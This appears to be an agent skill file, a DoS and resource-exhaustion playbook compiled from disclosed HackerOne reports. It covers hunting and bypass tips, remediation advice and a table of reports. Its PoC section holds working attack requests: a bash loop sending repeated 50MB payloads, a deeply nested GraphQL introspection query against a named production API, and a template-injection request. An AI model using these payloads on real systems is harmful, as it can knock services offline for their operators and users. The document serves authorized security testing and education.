---
name: dos-resource-consumption
description: "Denial of Service & Resource Exhaustion offensive playbook from 272 disclosed HackerOne reports (11 critical, 56 high, 129 medium, 76 low). Use when hunting or reviewing denial of service & resource exhaustion. Triggers: service, denial, dos, server, attack."
license: "For authorized security testing and education only."
---

# Denial of Service & Resource Exhaustion

> Distilled from **272** disclosed HackerOne reports. Real examples and the full
> report list are in [reference.md](reference.md).

## What it is

A cheap request causes disproportionate CPU/memory/IO/storage use  -  algorithmic complexity (ReDoS), unbounded allocation, amplification, or infinite loops.

## Where to hunt

- Look for user-controlled sizes/counts/regex, decompression, recursive parsing, and expensive queries with no limits.

## Exploitation playbook

- ReDoS with catastrophic-backtracking input; decompression/zip bombs; huge pagination or nested payloads.
- Amplification where one request fans out to many expensive operations.

## Bypass techniques

- Stay under per-request size caps while still triggering superlinear work.

## Impact & escalation

- Single-request or low-volume outage of the service.

## Remediation

- Input size/complexity limits, safe regex engines/timeouts, bounded allocation, pagination caps, decompression limits.

## Concrete payloads & PoCs

Extracted from disclosed writeups. Adapt to the target; test only where authorized.

### 1. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Content-Type: application/x-www-form-urlencoded
Content-Length: 209
Origin: https://hackyholidays.h1ctf.com

preview_markup=yes{{template:cbdj3_/*grinch*/_header.html}}{{77}}&preview_data={"name":"admin","email":"admin@admin.com","admin":true,"administrator":true,"77":"{{template:38dhs_/*admins_only*/_header.html}}"}
```

### 2. [#1680241](https://hackerone.com/reports/1680241)  -  DoS via Automatic Response Message
*medium*

```bash
$ python2.7 -c "print '{\"notify_props\":{\"auto_responder_active\":\"true\",\"auto_responder_message\":\"' + 'A' * 50000000 + '\"}}'" > payload

$ for ((i = 0; i < 5; i++)); do curl -X PUT "http://<domain>/api/v4/users/me/patch" -H 'Content-Type: application/json' -d @payload --cookie "MMAUTHTOKEN=<token>" -H "X-CSRF-TOKEN: <csrf-token>" &; done;
```

### 3. [#993582](https://hackerone.com/reports/993582)  -  Application DOS via specially crafted payload on 3d.cs.money
*medium*

```http
POST /api/skin/search HTTP/1.1
Host: 3d.cs.money
Content-Type: application/json;charset=utf-8
Content-Length: 32
Origin: https://3d.cs.money
Referer: https://3d.cs.money/item/default
Cookie: __cfduid=d38bfad20d6ec52ba0a6af9014d27a2e81601313370; TEST_GROUP=2; UUID3D=to4nZuWnRSS4A7G; …

{"name":"[Payload here]","item_name":"AK-47"}
```

### 4. [#861170](https://hackerone.com/reports/861170)  -  Attacker with an Old account might still be able to DoS ctf.hacker1…
*low*

```http
GET /group HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/group
Cookie: ███████
```

### 5. [#861170](https://hackerone.com/reports/861170)  -  Attacker with an Old account might still be able to DoS ctf.hacker1…
*low*

```http
GET /group HTTP/1.1
Host: ctf.hacker101.com
Referer: https://ctf.hacker101.com/group
Cookie: ███████

'''
```

### 6. [#2048725](https://hackerone.com/reports/2048725)  -  Circular based introspetion Query leading to single request denial …
*medium*

```http
POST /graphql HTTP/2
Host: api.sorare.com
Referer: https://api.sorare.com/graphql/playground
Content-Type: application/json
Origin: https://api.sorare.com
Content-Length: 262

{"operationName":null,"variables":{},"query":"query {\r\n __schema {\r\n   types { \r\n    fields {\r\n      type {\r\n    fields {\r\n      type { \r\n    fields {\r\n      type {\r\n     fields {\r\n     name\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}\r\n}"}
```

More payloads: see [payloads.md](payloads.md) (154 curated).

## Recurring patterns in this dataset

Most frequent terms across the 272 reports (term (count)): `service` (146), `denial` (137), `dos` (123), `server` (78), `attack` (77), `discovered` (57), `cause` (53), `versions` (52), `redos` (50), `attacker` (50), `memory` (50), `allowed` (48), `crafted` (44), `parsing` (43), `caused` (39), `denial-of-service` (37), `input` (37), `leading` (35)

## Top disclosed examples

| Report | Severity | Bounty | Program | Title |
| :-- | :-- | :-- | :-- | :-- |
| [#1086850](https://hackerone.com/reports/1086850) | critical | $500 | makerdao_bbp | xmlrpc.php FILE IS enabled it will used for Bruteforce attack and Denial of Service(DoS) |
| [#800140](https://hackerone.com/reports/800140) | critical | $250 | nodejs | Malformed HTTP/2 SETTINGS frame leads to reachable assert |
| [#868834](https://hackerone.com/reports/868834) | critical | $250 | nodejs | Denial of Service by resource exhaustion CWE-400 due to unfinished HTTP/1.1 requests |
| [#303632](https://hackerone.com/reports/303632) | critical |  -  | nodejs-ecosystem | Fastify denial-of-service vulnerability with large JSON payloads |
| [#319809](https://hackerone.com/reports/319809) | critical |  -  | nodejs-ecosystem | `memjs` allocates and stores buffers on typed input, resulting in DoS and uninitialized… |
| [#804772](https://hackerone.com/reports/804772) | critical |  -  | nodejs-ecosystem | Prototype pollution in multipart parsing |
| [#381185](https://hackerone.com/reports/381185) | critical |  -  | nodejs-ecosystem | Prototype pollution attack (extend) |
| [#1065493](https://hackerone.com/reports/1065493) | critical |  -  | h1-ctf | [CTF] I've DDoSed Grinch Network |

*See [reference.md](reference.md) for all 272 reports in this class.*
